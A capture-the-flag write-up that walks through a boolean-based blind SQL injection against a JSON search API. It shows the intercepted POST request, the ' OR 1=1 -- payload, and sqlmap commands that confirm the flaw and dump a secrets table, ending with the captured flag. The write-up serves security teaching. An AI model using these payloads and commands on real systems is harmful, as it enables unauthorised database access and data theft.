HACK SQL - CTF Write-Up

From Pawn to King: Step-by-Step SQL Injection

Introduction

A minimal interface hides a powerful backend. In this challenge we start as the "pawn" tester, uncover the weakness, and end up "king" with the database flag.

Visiting the Site

We land on a sparse search page sending JSON to an API. No flashy clues - perfect for quiet recon.

What we see:

  • A single search input field.
  • A bold SCAN button.
  • No login or authentication.

What this tells us:

  • User input is being processed by the backend.
  • It is most likely connected to a database.
  • This is a classic SQL injection scenario.

Finding the Vulnerability

Using Burp Suite, we intercept the request sent when SCAN is clicked. It is a JSON POST to /api/check with a single field q.

POST /api/check HTTP/1.1
Content-Type: application/json

{"q":"test"}

Important observations:

  • The request uses POST.
  • The data is sent as JSON.
  • The parameter name is q.
  • The value of "test" is directly user-controlled.

This tells us the backend likely uses q inside an SQL query.

Manual SQL Injection Testing (before sqlmap)

Step 1 - Test normal input (baseline):

{"q":"test"}

Response:

{"ok":false}

This means the backend searched the database, found no match, and returned normally. Good baseline.

Step 2 - Test a simple SQL injection payload:

{"q":"' OR 1=1 --"}

Why this payload?

  • ' tries to break the SQL string.
  • OR 1=1 is always true.
  • -- comments out the rest of the query.

Response flips to something like:

{"ok":true,"signal":"detected"}

This is very important: our injected SQL changed the logic and the app behaved differently. SQL injection is confirmed manually.

Understanding the type:

  • No SQL error messages are shown.
  • The app only returns true/false style answers.
  • We cannot see raw database output.

Therefore, the vulnerability is boolean-based blind SQL injection.

Exploiting with SQLMap

Now that SQL injection is confirmed, we automate with sqlmap using the same JSON body, the correct header, and the q parameter.

sqlmap -u "http://<target>/api/check"  --data='{"q":"test"}' --headers="Content-Type: application/json" -p q --dbms=sqlite --technique=B --batch --level=5 --risk=3

sqlmap confirms:

  • Parameter q is injectable.
  • Injection type: boolean-based blind.
  • Database: SQLite.

Extracting the Flag

sqlmap output shows a table called secrets with a column flag. We dump exactly what we need:

sqlmap -u "http://<target>/api/check" --data='{"q":"test"}' --headers="Content-Type: application/json" -p q --dbms=sqlite --technique=B --batch --dump -T secrets -C flag
CYBERDUNE{safi_m3ana_zid_04919}

Final result: challenge solved and flag captured.

What We Learned

  • How to inspect JSON-based POST requests.
  • Why a clean baseline request ({"q":"test"}) matters.
  • How to manually confirm SQL injection before using tools.
  • Difference between error-based and blind SQL injection.
  • How to configure sqlmap correctly for JSON, POST, parameter q, and SQLite.
  • Real pentesting always starts with careful manual recon.
